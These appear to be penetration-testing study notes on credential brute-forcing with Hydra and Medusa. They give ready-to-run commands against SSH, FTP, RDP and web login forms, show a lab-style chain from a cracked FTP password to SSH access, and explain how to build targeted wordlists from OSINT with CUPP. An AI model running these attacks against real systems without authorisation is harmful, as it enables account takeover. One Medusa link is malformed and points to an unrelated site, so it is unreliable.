# Hydra
- Crafting the correct params string is crucial for a successful Hydra attack. Accurate information about the form's structure and behavior is essential for constructing this string effectively. 

- Can brute force FTP, SSH, HTTP, SMTP, POP3, IMAP, MYSQL, MSSQL, VNC, RDP:
- HTTP: `hydra -L usernames.txt -P passwords.txt www.example.com http-get`
- Multiple SSH servers: `hydra -l root -p toor -M targets.txt ssh`
- FTP on non-standard port: `hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp`
- Web Login Form: `hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"`
- RDP Brute-forcing: `hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp`

```
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```

- Look at the HTML of the login form for details


- The `POST` method indicates that data is being sent to the server to create or update a resource.
- `/login` is the URL endpoint handling the login request.
- The `Content-Type` header specifies how the data is encoded in the request body.
- The `Content-Length` header indicates the size of the data being sent.
- The request body contains the username and password, encoded as key-value pairs.
- Hydra's `http-post-form` service is specifically designed to target login forms: `hydra [options] target http-post-form "path:params:condition_string"`
- You can specify what success or failure is:
  - `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"`
  - `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"`
  - `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"`

- Form Parameters: These are the essential fields that hold the username and password. Hydra will dynamically replace placeholders (^USER^ and ^PASS^) within these parameters with values from your wordlists.
- Additional Fields: If the form includes other hidden fields or tokens (e.g., CSRF tokens), they must also be included in the params string. These can have static values or dynamic placeholders if their values change with each request.
- Success Condition: This defines the criteria Hydra will use to identify a successful login. It can be an HTTP status code (like S=302 for a redirect) or the presence or absence of specific text in the server's response (e.g., F=Invalid credentials or S=Welcome).

- The form submits data to the root path (`/`).
  - The username field is named `username`.
  - The password field is named `password`.
 
Therefore, the `params` string would be:
- `/:username=^USER^&password=^PASS^:F=Invalid credentials`
  - `"/"`: The path where the form is submitted.
  -  `username=^USER^&password=^PASS^`: The form parameters with placeholders for Hydra.
  -  `F=Invalid credentials`: The failure condition – Hydra will consider a login attempt unsuccessful if it sees this string in the response.
 
Resulting in - `hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"`

# [Medusa]([url](https://docs.medusajs.com/learn/fundamentals/modules))
- `medusa [target_options] [credential_options] -M module [module_options]`
- Useful for FTP, HTTP, IMAP, MYSQL, POP3, RDP, SSHV2, SUBVERSION(SVN), TELNET, VNX, Web Form.
- SSH Server: `medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh`
- Multiple HTTP Auth: `medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET `
- test for empty or default passwords (where user = password: `medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name`

- Reminder SSH Login: `ssh sshuser@<IP> -p PORT`

- Find SSH access --> run `nmap localhost` --> run new medusa command on FTP port found: `medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5` --> Found ftpuser password then run `ftp <IP>` --> enter user --> enter password -->> find file --> `get filename1` --> now in SSH shell

- Make a custom wordlist with `Username Anarchy`
  - `/username-anarchy Jane Smith > jane_smith_usernames.txt`
  - txt file created will have a bunch of username variations based off `Jane Smith`
 
- Make custom password lists with `CUPP`:
  - CUPP will take your inputs and create a comprehensive list of potential passwords
  - OSINT will be a goldmine of information for CUPP
  - Spawn CUPP with `cupp -i` and follow the prompts
